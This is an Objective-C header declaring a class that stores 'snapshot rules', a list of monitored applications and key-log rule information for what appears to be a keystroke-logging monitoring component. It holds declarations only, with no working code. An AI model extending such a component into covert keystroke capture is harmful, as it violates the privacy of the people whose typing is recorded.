//
//  KeySnapShotRuleStore.h
//  KeySnapShotRuleManager
//
//  Created by Makara Khloth on 10/24/13.
//  Copyright (c) 2013 Vervata. All rights reserved.
//

#import <Foundation/Foundation.h>

@class SnapShotRule;

@interface KeySnapShotRuleStore : NSObject {
@private
    SnapShotRule    *mSnapShotRule;
    NSArray         *mMonitorApplications;
    
    NSString        *mSnapShotRuleFilePath;
}

@property (nonatomic, retain) SnapShotRule *mSnapShotRule;
@property (nonatomic, retain) NSArray *mMonitorApplications;
@property (nonatomic, copy) NSString *mSnapShotRuleFilePath;

- (id) initWithSnapShotRuleFilePath: (NSString *) aSnapShotRuleFilePath;

- (void) saveSnapShotRule: (SnapShotRule *) aSnapShotRule;
- (void) saveMonitorApplications: (NSArray *) aMonitorApplications;

- (NSDictionary *) getKeyLogRuleInfo;
- (NSDictionary *) getMonitorApplicationInfo;

- (void) deleteAllRules;

@end
